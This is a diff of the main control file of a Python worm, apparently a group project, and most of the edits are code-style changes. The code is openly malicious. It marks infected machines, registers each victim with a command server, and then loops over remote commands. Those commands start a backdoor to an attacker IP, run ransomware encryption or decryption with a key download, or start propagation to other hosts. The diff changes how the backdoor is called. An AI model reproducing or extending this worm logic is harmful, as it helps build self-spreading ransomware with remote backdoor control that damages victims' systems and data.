@@ -25,20 +25,22 @@ NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")
 
 # PUBLIC_IP = subprocess.run(['curl', 'ifconfig.co'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
 # PUBLIC_IP = PUBLIC_IP.stdout.strip()
-PUBLIC_IP = os.environ.get('USER')
+PUBLIC_IP = os.environ.get("USER")
 
-print(f'Public IP: {PUBLIC_IP}')
+print(f"Public IP: {PUBLIC_IP}")
 
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
 
+
 def main():
     print("Worm just landed!")
 
-    # Creates a file for the propagation module to identify whether a computer is already infected or not   
-    if not(os.path.exists(NO_INFECTION_FILE)):
-        with open(NO_INFECTION_FILE, 'w') as file: pass
+    # Creates a file for the propagation module to identify whether a computer is already infected or not
+    if not (os.path.exists(NO_INFECTION_FILE)):
+        with open(NO_INFECTION_FILE, "w") as file:
+            pass
 
     # Creates a instructions file on the server for this specific victim
     instructions.create_victim_instruction(PUBLIC_IP)
@@ -61,8 +63,10 @@ def main():
 
     while next_step != "clean":
         # Execute module and get result and next step
-        if next_step == "instructions": result, next_step = modules[next_step](PUBLIC_IP)
-        else: result, next_step = modules[next_step]()
+        if next_step == "instructions":
+            result, next_step = modules[next_step](PUBLIC_IP)
+        else:
+            result, next_step = modules[next_step]()
         result = result.split(" ")
 
         if result and len(result) >= 2:
@@ -76,9 +80,7 @@ def main():
             elif result[0] == "backdoor":
                 if len(result) >= 3:
                     if result[1] == "start":
-                        backdoor.start_backdoor(attacker_ip=result[2])
-                    elif result[1] == "stop":
-                        backdoor.stop_backdoor(attacker_ip=result[2])
+                        backdoor.run(attacker_ip=result[2])
 
             elif result[0] == "ransomware":
                 if result[1] == "encrypt":
@@ -87,7 +89,8 @@ def main():
                     instructions.download_secret_key()
 
             elif result[0] == "propagation":
-                if result[1] == "start": propagation.run()
+                if result[1] == "start":
+                    propagation.run()
 
             if result != "no_data":
                 instructions.reset_instruction(PUBLIC_IP)
